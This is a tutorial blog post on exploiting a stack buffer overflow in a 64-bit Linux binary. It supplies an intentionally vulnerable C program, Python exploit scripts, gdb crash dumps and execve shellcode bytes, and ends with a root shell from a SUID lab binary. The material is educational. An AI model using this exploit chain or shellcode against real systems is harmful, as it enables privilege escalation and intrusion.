This series of tutorials is aimed as a quick introduction to exploiting buffer overflows on 64-bit Linux binaries. It's geared primarily towards folks who are already familiar with exploiting 32-bit binaries and are wanting to apply their knowledge to exploiting 64-bit binaries. This tutorial is the result of compiling scattered notes I've collected over time into a cohesive whole. 

<!-- more --> 

I'd like to give special thanks to [barrebas](https://twitter.com/barrebas) for taking the time to proof read my writing and for providing valuable feedback. Much appreciated!

Setup
--

Writing exploits for 64-bit Linux binaries isn't too different from writing 32-bit exploits. There are however a few gotchas and I'll be touching on those as we go along. The best way to learn this stuff is to do it, so I encourage you to follow along. I'll be using [Ubuntu 14.10](http://cdimage.ubuntu.com/netboot/14.10/) to compile the vulnerable binaries as well as to write the exploits. I'll provide pre-compiled binaries as well in case you don't want to compile them yourself. I'll also be making use of the following tools for this particular tutorial: 

- [Python Exploit Development Assistance for GDB](https://github.com/longld/peda)
- [getenvaddr.c](https://gist.github.com/superkojiman/6a6e44db390d6dfc329a)

64-bit, what you need to know
--

For the purpose of this tutorial, you should be aware of the following points: 

- General purpose registers have been expanded to 64-bit. So we now have RAX, RBX, RCX, RDX, RSI, and RDI. 
- Instruction pointer, base pointer, and stack pointer have also been expanded to 64-bit as RIP, RBP, and RSP respectively.
- Additional registers have been provided: R8 to R15. 
- Pointers are 8-bytes wide. 
- Push/pop on the stack are 8-bytes wide.
- Maximum canonical address size of 0x00007FFFFFFFFFFF. 
- Parameters to functions are passed through registers. 

It's always good to know more, so feel free to Google information on 64-bit architecture and assembly programming. [Wikipedia](http://en.wikipedia.org/wiki/X86-64) has a nice short article that's worth reading. 

Classic stack smashing
--

Let's begin with a classic stack smashing example. We'll disable ASLR, NX, and stack canaries so we can focus on the actual exploitation. The source code for our vulnerable binary is as follows: 

```c
/* Compile: gcc -fno-stack-protector -z execstack classic.c -o classic */
/* Disable ASLR: echo 0 > /proc/sys/kernel/randomize_va_space           */ 

#include <stdio.h>
#include <unistd.h>

int vuln() {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Try to exec /bin/sh");
    vuln();
    return 0;
}
```

You can also grab the precompiled binary [here](https://gist.github.com/superkojiman/595524f6b96c79380568). 

There's an obvious buffer overflow in the vuln() function when read() can copy up to 400 bytes into an 80 byte buffer. So technically if we pass 400 bytes in, we should overflow the buffer and overwrite RIP with our payload right? Let's create an exploit containing the following:

```python
#!/usr/bin/env python
buf = ""
buf += "A"*400

f = open("in.txt", "w")
f.write(buf)
```

This script will create a file called in.txt containing 400 "A"s. We'll load classic into gdb and redirect the contents of in.txt into it and see if we can overwrite RIP:

```text
gdb-peda$ r < in.txt
Try to exec /bin/sh
Read 400 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
No shell for you :(

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7b015a0 (<__write_nocancel+7>:  cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd5a00 --> 0x0
RSI: 0x7ffff7ff5000 ("No shell for you :(\nis ", 'A' <repeats 92 times>"\220, \001\n")
RDI: 0x1
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe508 ('A' <repeats 200 times>...)
RIP: 0x40060f (<vuln+73>:   ret)
R8 : 0x283a20756f792072 ('r you :(')
R9 : 0x4141414141414141 ('AAAAAAAA')
R10: 0x7fffffffe260 --> 0x0
R11: 0x246
R12: 0x4004d0 (<_start>:    xor    ebp,ebp)
R13: 0x7fffffffe600 ('A' <repeats 48 times>, "|\350\377\377\377\177")
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400604 <vuln+62>:  call   0x400480 <puts@plt>
   0x400609 <vuln+67>:  mov    eax,0x0
   0x40060e <vuln+72>:  leave
=> 0x40060f <vuln+73>:  ret
   0x400610 <main>: push   rbp
   0x400611 <main+1>:   mov    rbp,rsp
   0x400614 <main+4>:   sub    rsp,0x10
   0x400618 <main+8>:   mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe508 ('A' <repeats 200 times>...)
0008| 0x7fffffffe510 ('A' <repeats 200 times>...)
0016| 0x7fffffffe518 ('A' <repeats 200 times>...)
0024| 0x7fffffffe520 ('A' <repeats 200 times>...)
0032| 0x7fffffffe528 ('A' <repeats 200 times>...)
0040| 0x7fffffffe530 ('A' <repeats 200 times>...)
0048| 0x7fffffffe538 ('A' <repeats 200 times>...)
0056| 0x7fffffffe540 ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040060f in vuln ()
```

So the program crashed as expected, but not because we overwrote RIP with an invalid address. In fact we don't control RIP at all. Recall as I mentioned earlier that the maximum address size is 0x00007FFFFFFFFFFF. We're overwriting RIP with a non-canonical address of 0x4141414141414141 which causes the processor to raise an exception. In order to control RIP, we need to overwrite it with 0x0000414141414141 instead. So really the goal is to find the offset with which to overwrite RIP with a canonical address. We can use a cyclic pattern to find this offset: 

```
gdb-peda$ pattern_create 400 in.txt
Writing pattern of 400 chars to filename "in.txt"
```

Let's run it again and examine the contents of RSP:

```
gdb-peda$ r < in.txt
Try to exec /bin/sh
Read 400 bytes. buf is AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKA�
No shell for you :(

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7b015a0 (<__write_nocancel+7>:  cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd5a00 --> 0x0
RSI: 0x7ffff7ff5000 ("No shell for you :(\nis AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKA\220\001\n")
RDI: 0x1
RBP: 0x416841414c414136 ('6AALAAhA')
RSP: 0x7fffffffe508 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6"...)
RIP: 0x40060f (<vuln+73>:   ret)
R8 : 0x283a20756f792072 ('r you :(')
R9 : 0x4147414131414162 ('bAA1AAGA')
R10: 0x7fffffffe260 --> 0x0
R11: 0x246
R12: 0x4004d0 (<_start>:    xor    ebp,ebp)
R13: 0x7fffffffe600 ("A%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%Z|\350\377\377\377\177")
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400604 <vuln+62>:  call   0x400480 <puts@plt>
   0x400609 <vuln+67>:  mov    eax,0x0
   0x40060e <vuln+72>:  leave
=> 0x40060f <vuln+73>:  ret
   0x400610 <main>: push   rbp
   0x400611 <main+1>:   mov    rbp,rsp
   0x400614 <main+4>:   sub    rsp,0x10
   0x400618 <main+8>:   mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe508 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6"...)
0008| 0x7fffffffe510 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%"...)
0016| 0x7fffffffe518 ("jAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA"...)
0024| 0x7fffffffe520 ("AkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%j"...)
0032| 0x7fffffffe528 ("AAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%"...)
0040| 0x7fffffffe530 ("RAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA"...)
0048| 0x7fffffffe538 ("AoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%R"...)
0056| 0x7fffffffe540 ("AAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%"...)
[------------------------------------------------------------------------------]
```

We can clearly see our cyclic pattern on the stack. Let's find the offset: 

```
gdb-peda$ x/wx $rsp
0x7fffffffe508: 0x41413741

gdb-peda$ pattern_offset 0x41413741
1094793025 found at offset: 104
```

So RIP is at offset 104. Let's update our exploit and see if we can overwrite RIP this time: 

```python
#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*104                      # offset to RIP
buf += pack("<Q", 0x424242424242)   # overwrite RIP with 0x0000424242424242
buf += "C"*290                      # padding to keep payload length at 400 bytes

f = open("in.txt", "w")
f.write(buf)
```

Run it to create an updated in.txt file, and then redirect it into the program within gdb:

```text
gdb-peda$ r < in.txt
Try to exec /bin/sh
Read 400 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
No shell for you :(

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7b015a0 (<__write_nocancel+7>:  cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd5a00 --> 0x0
RSI: 0x7ffff7ff5000 ("No shell for you :(\nis ", 'A' <repeats 92 times>"\220, \001\n")
RDI: 0x1
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe510 ('C' <repeats 200 times>...)
RIP: 0x424242424242 ('BBBBBB')
R8 : 0x283a20756f792072 ('r you :(')
R9 : 0x4141414141414141 ('AAAAAAAA')
R10: 0x7fffffffe260 --> 0x0
R11: 0x246
R12: 0x4004d0 (<_start>:    xor    ebp,ebp)
R13: 0x7fffffffe600 ('C' <repeats 48 times>, "|\350\377\377\377\177")
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x424242424242
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe510 ('C' <repeats 200 times>...)
0008| 0x7fffffffe518 ('C' <repeats 200 times>...)
0016| 0x7fffffffe520 ('C' <repeats 200 times>...)
0024| 0x7fffffffe528 ('C' <repeats 200 times>...)
0032| 0x7fffffffe530 ('C' <repeats 200 times>...)
0040| 0x7fffffffe538 ('C' <repeats 200 times>...)
0048| 0x7fffffffe540 ('C' <repeats 200 times>...)
0056| 0x7fffffffe548 ('C' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000424242424242 in ?? ()
```

Excellent, we've gained control over RIP. Since this program is compiled without NX or stack canaries, we can write our shellcode directly on the stack and return to it. Let's go ahead and finish it. I'll be using a 27-byte shellcode that executes execve("/bin/sh") found [here](http://shell-storm.org/shellcode/files/shellcode-806.php). 

We'll store the shellcode on the stack via an environment variable and find its address on the stack using getenvaddr:

```
koji@pwnbox:~/classic$ export PWN=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`

koji@pwnbox:~/classic$ ~/getenvaddr PWN ./classic
PWN will be at 0x7fffffffeefa
```

We'll update our exploit to return to our shellcode at 0x7fffffffeefa:

```python
#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*104
buf += pack("<Q", 0x7fffffffeefa)

f = open("in.txt", "w")
f.write(buf)
```

Make sure to change the ownership and permission of classic to SUID root so we can get our root shell:

```text
koji@pwnbox:~/classic$ sudo chown root classic
koji@pwnbox:~/classic$ sudo chmod 4755 classic
```

And finally, we'll update in.txt and pipe our payload into classic: 

```
koji@pwnbox:~/classic$ python ./sploit.py
koji@pwnbox:~/classic$ (cat in.txt ; cat) | ./classic
Try to exec /bin/sh
Read 112 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
No shell for you :(
whoami
root
```

We've got a root shell, so our exploit worked. The main gotcha here was that we needed to be mindful of the maximum address size, otherwise we wouldn't have been able to gain control of RIP. This concludes part 1 of the tutorial. 

Part 1 was pretty easy, so for part 2 we'll be using the same binary, only this time it will be compiled with NX. This will prevent us from executing instructions on the stack, so we'll be looking at using ret2libc to get a root shell. Stay tuned!

